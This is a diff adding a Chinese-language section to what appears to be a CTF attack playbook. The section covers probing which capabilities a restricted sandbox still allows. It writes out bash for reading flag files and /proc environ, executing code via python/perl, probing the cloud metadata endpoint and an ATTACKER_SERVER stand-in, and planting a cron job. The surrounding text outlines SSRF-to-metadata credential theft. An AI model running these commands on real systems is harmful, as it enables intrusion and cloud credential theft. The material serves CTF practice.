@@ -43,3 +43,35 @@ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
 3. 函数接受 URL → 打 SSRF 到 metadata。
 4. 函数接受文件上传/命令 → 直接 RCE。
 5. 云凭据在握 → 枚举 S3/Secrets/其他函数。
+
+## 沙箱能力测试（描述含「运行时限制/能力仍可用」时优先做）
+
+题目描述出现「运行时限制」「哪些能力仍可用」「沙箱」「迁移后」等词时，说明
+有代码/命令执行入口，但被沙箱部分限制。**逐个测试哪些能力仍然可用**，而不是
+按常规流程枚举：
+
+```bash
+# 1. 文件读取（最常仍然可用）
+cat /flag /flag.txt /challenge/flag* 2>/dev/null
+cat /proc/1/environ | tr '\0' '\n' | grep -i flag
+
+# 2. 命令执行（若 bash 被禁，换 python/perl/awk）
+id; whoami; ls -la /
+python3 -c 'import os; print(os.listdir("/"))'
+perl -e 'print `ls -la /`'
+
+# 3. 网络出站（SSRF/回连是否被禁）
+curl -s http://169.254.169.254/latest/meta-data/ --max-time 3
+curl -s http://ATTACKER_SERVER/ --max-time 3
+
+# 4. 目录写（能否落 shell/计划任务）
+touch /tmp/x && echo writable
+echo '* * * * * bash -c "cat /flag > /tmp/f"' > /tmp/cron 2>/dev/null
+
+# 5. 环境变量与进程
+env | sort
+ps aux
+```
+
+**要点**：迁移/沙箱类题的关键不是“找到漏洞”，而是“在已有执行能力里找出
+未被限制的那一个”。先列出一个能力清单逐个打勾，不要只试一次就放弃。
